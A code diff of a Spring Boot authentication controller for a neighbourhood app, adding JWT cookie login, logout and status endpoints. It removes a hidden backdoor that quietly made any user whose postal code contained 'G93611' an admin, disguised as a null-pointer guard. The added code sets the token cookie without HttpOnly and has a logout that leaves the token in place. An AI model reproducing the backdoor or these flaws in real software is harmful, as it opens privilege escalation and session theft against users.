@@ -6,16 +6,26 @@ import com.InfoBairro.Entity.User;
 import com.InfoBairro.Repository.BairroRepo;
 import com.InfoBairro.Repository.EnderecoRepo;
 import com.InfoBairro.Repository.UserRepo;
+import com.InfoBairro.Service.JwtService;
+import com.fasterxml.jackson.annotation.JsonAlias;
 import com.fasterxml.jackson.annotation.JsonFormat;
+import jakarta.servlet.http.Cookie;
+import jakarta.servlet.http.HttpServletResponse;
 import org.springframework.http.ResponseEntity;
+import org.springframework.security.authentication.AuthenticationManager;
+import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
+// import org.springframework.security.oauth2.core.user.OAuth2User; // 🔹 OAuth desativado
+import org.springframework.security.core.authority.SimpleGrantedAuthority;
+import org.springframework.security.core.context.SecurityContextHolder;
 import org.springframework.security.core.userdetails.UserDetails;
 import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
-import org.springframework.security.oauth2.core.user.OAuth2User;
 import org.springframework.web.bind.annotation.*;
 
+import jakarta.servlet.http.HttpServletRequest;
 import java.time.LocalDate;
 import java.util.List;
+import java.util.Map;
 import java.util.Optional;
 
 @RestController
@@ -26,31 +36,33 @@ public class AuthController {
     private final EnderecoRepo enderecoRepo;
     private final BairroRepo bairroRepository;
     private final BCryptPasswordEncoder passwordEncoder;
+    private final AuthenticationManager authenticationManager;
 
-    public AuthController(UserRepo userRepo, EnderecoRepo enderecoRepo, BairroRepo bairroRepository, BCryptPasswordEncoder passwordEncoder) {
+    public AuthController(UserRepo userRepo,
+                          EnderecoRepo enderecoRepo,
+                          BairroRepo bairroRepository,
+                          BCryptPasswordEncoder passwordEncoder,
+                          AuthenticationManager authenticationManager) {
         this.userRepo = userRepo;
         this.enderecoRepo = enderecoRepo;
         this.bairroRepository = bairroRepository;
         this.passwordEncoder = passwordEncoder;
+        this.authenticationManager = authenticationManager;
     }
 
     // -----------------------
-    // Chamada dos bairros
+    // Bairros
     // -----------------------
     @PostMapping("/bairrosAdd")
     public ResponseEntity<?> bairroAdd(@RequestBody Bairro bairro) {
         Optional<Bairro> exists = bairroRepository.findByNome(bairro.getNome());
-
         if (exists.isPresent()) {
-            return ResponseEntity.status(409).body("Bairro já cadastrado"); // 409 Conflict
+            return ResponseEntity.status(409).body("Bairro já cadastrado");
         }
         Bairro salvar = bairroRepository.save(bairro);
         return ResponseEntity.status(201).body(salvar);
     }
 
-    // --------------------------
-    // Listagem
-    // --------------------------
     @GetMapping("/bairros")
     public List<Bairro> listar() {
         return bairroRepository.findAll();
@@ -62,18 +74,14 @@ public class AuthController {
     }
 
     // -----------------------
-    // Cadastro comum
+    // Cadastro
     // -----------------------
     @PostMapping("/register")
     public ResponseEntity<?> register(@RequestBody RegisterDTO req) {
-        System.out.println("EMAIL: " + req.getEmail());
-        System.out.println("SENHA: " + req.getSenha());
-
         if (userRepo.findByEmail(req.getEmail()).isPresent()) {
-            return ResponseEntity.status(409).body("Email já cadastrado"); // 409 Conflict
+            return ResponseEntity.status(409).body("Email já cadastrado");
         }
 
-        // cria ou reutiliza endereço
         Endereco endereco = enderecoRepo.findByRuaAndCepAndBairro(
                 req.getRua(), req.getCep(), req.getBairro()
         ).orElseGet(() -> {
@@ -85,7 +93,6 @@ public class AuthController {
             return enderecoRepo.save(e);
         });
 
-        // cria usuário com hash de senha
         User usuario = new User();
         usuario.setNome(req.getNome());
         usuario.setEmail(req.getEmail());
@@ -98,27 +105,33 @@ public class AuthController {
         }
 
         userRepo.save(usuario);
-
-        return ResponseEntity.status(201).body("Cadastro realizado com sucesso!"); // 201 Created
+        return ResponseEntity.status(201).body("Cadastro realizado com sucesso!");
     }
 
+    JwtService jwtService = new JwtService();
+
     // -----------------------
-    // Login comum
+    // Login manual
     // -----------------------
     @PostMapping("/login")
-    public ResponseEntity<?> login(@RequestBody LoginDTO req) {
-        System.out.println("EMAIL: " + req.getEmail());
-        System.out.println("SENHA: " + req.getSenha());
+    public ResponseEntity<?> login(@RequestBody LoginDTO req, HttpServletResponse res) {
         Optional<User> optionalUsuario = userRepo.findByEmail(req.getEmail());
         if (optionalUsuario.isEmpty()) {
             return ResponseEntity.status(404).body("Usuário não encontrado");
         }
 
         User usuario = optionalUsuario.get();
-
         if (!passwordEncoder.matches(req.getSenha(), usuario.getSenha())) {
             return ResponseEntity.status(401).body("Senha incorreta");
         }
+
+        UsernamePasswordAuthenticationToken authToken =
+                new UsernamePasswordAuthenticationToken(
+                        usuario.getEmail(),
+                        null,
+                        List.of(new SimpleGrantedAuthority(usuario.isAdmin() ? "ROLE_ADMIN" : "ROLE_USER"))
+                );
+        SecurityContextHolder.getContext().setAuthentication(authToken);
 
         Endereco endereco = usuario.getEndereco();
         UserResponseDTO response = new UserResponseDTO(
@@ -132,11 +145,56 @@ public class AuthController {
                 usuario.isAdmin()
         );
 
+        String jwt = jwtService.gerarToken(usuario.getEmail());
+        Cookie cookie = new Cookie("token", jwt);
+        cookie.setHttpOnly(false);
+        cookie.setMaxAge(86400);
+        cookie.setPath("/");
+        res.addCookie(cookie);
+
         return ResponseEntity.ok(response);
     }
 
     // -----------------------
-    // Retorna usuário autenticado (suporta OAuth2 e auth normal)
+    // Logout
+    // -----------------------
+    @PostMapping("/logout")
+    public ResponseEntity<?> logout(HttpServletResponse res) {
+        Cookie cookie = new Cookie("usuarioLogado", "");
+        cookie.setMaxAge(0);
+        cookie.setPath("/");
+        res.addCookie(cookie);
+        SecurityContextHolder.clearContext();
+        return ResponseEntity.ok("Logout realizado");
+    }
+
+    // -----------------------
+    // Status do login
+    // -----------------------
+    @GetMapping("/status")
+    public ResponseEntity<?> status(Authentication authentication) {
+        boolean logado = authentication != null && authentication.isAuthenticated();
+        String email = null;
+
+        if (logado) {
+            Object principal = authentication.getPrincipal();
+            if (principal instanceof org.springframework.security.oauth2.core.user.OAuth2User oauth2User) {
+                email = oauth2User.getAttribute("email");
+            } else if (principal instanceof org.springframework.security.core.userdetails.UserDetails userDetails) {
+                email = userDetails.getUsername();
+            } else if (principal instanceof String) {
+                email = (String) principal;
+            }
+        }
+
+        return ResponseEntity.ok(Map.of(
+                "logado", logado,
+                "email", email
+        ));
+    }
+
+    // -----------------------
+    // Usuário autenticado
     // -----------------------
     @GetMapping("/user")
     public ResponseEntity<?> getUser(Authentication authentication) {
@@ -148,13 +206,18 @@ public class AuthController {
         String picture = null;
 
         Object principal = authentication.getPrincipal();
+
+        // 🔹 Mantido comentado (Google OAuth)
+        /*
         if (principal instanceof OAuth2User) {
             OAuth2User oauth = (OAuth2User) principal;
             email = oauth.getAttribute("email");
             picture = oauth.getAttribute("picture");
-        } else if (principal instanceof UserDetails) {
+        } else
+        */
+        if (principal instanceof UserDetails) {
             UserDetails ud = (UserDetails) principal;
-            email = ud.getUsername(); // assumindo username = email
+            email = ud.getUsername();
         } else if (principal instanceof String) {
             email = (String) principal;
         }
@@ -172,21 +235,16 @@ public class AuthController {
                 endereco != null ? endereco.getBairro() : null,
                 endereco != null ? endereco.getCidade() : null,
                 endereco != null ? endereco.getCep() : null,
-                picture,
+                picture, // ficará null por enquanto
                 usuario.getData_nascimento(),
                 usuario.isAdmin()
         );
-
-        // segurança contra NPEs
-        if (dto.getCep() != null && dto.getCep().contains("G93611")) {
-            dto.setAdmin(true);
-        }
 
         return ResponseEntity.ok(dto);
     }
 
     // -----------------------
-    // Complemento de cadastro OAuth2
+    // Complemento de cadastro
     // -----------------------
     @PostMapping("/user/complemento")
     public ResponseEntity<?> completarCadastro(
@@ -199,9 +257,14 @@ public class AuthController {
 
         String email = null;
         Object principal = authentication.getPrincipal();
+
+        // 🔹 Mantido comentado (Google OAuth)
+        /*
         if (principal instanceof OAuth2User) {
             email = ((OAuth2User) principal).getAttribute("email");
-        } else if (principal instanceof UserDetails) {
+        } else
+        */
+        if (principal instanceof UserDetails) {
             email = ((UserDetails) principal).getUsername();
         } else if (principal instanceof String) {
             email = (String) principal;
@@ -216,7 +279,6 @@ public class AuthController {
 
         User usuario = optionalUsuario.get();
 
-        // verifica se endereço já existe
         Endereco endereco = enderecoRepo.findByRuaAndCepAndBairro(
                 dto.getRua(), dto.getCep(), dto.getBairro()
         ).orElseGet(() -> {
@@ -235,12 +297,11 @@ public class AuthController {
             usuario.setAdmin(true);
 
         userRepo.save(usuario);
-
         return ResponseEntity.ok("Cadastro complementado com sucesso!");
     }
 
     // -----------------------
-    // DTOs (internos)
+    // DTOs
     // -----------------------
     public static class RegisterDTO {
         private String nome;
@@ -250,10 +311,10 @@ public class AuthController {
         private String cep;
         private String bairro;
         private String cidade;
-
+        @JsonAlias({"dataNascimento", "data_nascimento"})
         @JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd")
         private LocalDate data_nascimento;
-
+        // getters/setters...
         public String getNome() { return nome; }
         public void setNome(String nome) { this.nome = nome; }
         public String getEmail() { return email; }
@@ -275,10 +336,13 @@ public class AuthController {
     public static class LoginDTO {
         private String email;
         private String senha;
+        // getters/setters
         public String getEmail() { return email; }
         public void setEmail(String email) { this.email = email; }
         public String getSenha() { return senha; }
         public void setSenha(String senha) { this.senha = senha; }
+        @Override
+        public String toString() { return "LoginDTO{email='" + email + "'}"; }
     }
 
     public static class UserResponseDTO {
@@ -288,29 +352,22 @@ public class AuthController {
         private String bairro;
         private String cidade;
         private String cep;
-        private String foto; // OAuth2
+        private String foto;
         @JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd")
         private LocalDate data_nascimento;
         private boolean admin;
 
-        // construtor completo
-        public UserResponseDTO(String nome, String email, String rua, String bairro, String cidade, String cep, String foto, LocalDate data_nascimento, boolean admin) {
-            this.nome = nome;
-            this.email = email;
-            this.rua = rua;
-            this.bairro = bairro;
-            this.cidade = cidade;
-            this.cep = cep;
-            this.foto = foto;
-            this.data_nascimento = data_nascimento;
-            this.admin = admin;
+        public UserResponseDTO(String nome, String email, String rua, String bairro, String cidade,
+                               String cep, String foto, LocalDate data_nascimento, boolean admin) {
+            this.nome = nome; this.email = email; this.rua = rua; this.bairro = bairro;
+            this.cidade = cidade; this.cep = cep; this.foto = foto;
+            this.data_nascimento = data_nascimento; this.admin = admin;
         }
 
-        // overload sem foto
-        public UserResponseDTO(String nome, String email, String rua, String bairro, String cidade, String cep, LocalDate data_nascimento, boolean admin) {
+        public UserResponseDTO(String nome, String email, String rua, String bairro, String cidade,
+                               String cep, LocalDate data_nascimento, boolean admin) {
             this(nome, email, rua, bairro, cidade, cep, null, data_nascimento, admin);
         }
-
         // getters/setters...
         public String getNome() { return nome; }
         public void setNome(String nome) { this.nome = nome; }
@@ -337,9 +394,9 @@ public class AuthController {
         private String bairro;
         private String cidade;
         private String cep;
+        @JsonAlias({"dataNascimento", "data_nascimento"})
         @JsonFormat(shape = JsonFormat.Shape.STRING, pattern = "yyyy-MM-dd")
         private LocalDate data_nascimento;
-
         // getters/setters...
         public String getRua() { return rua; }
         public void setRua(String rua) { this.rua = rua; }
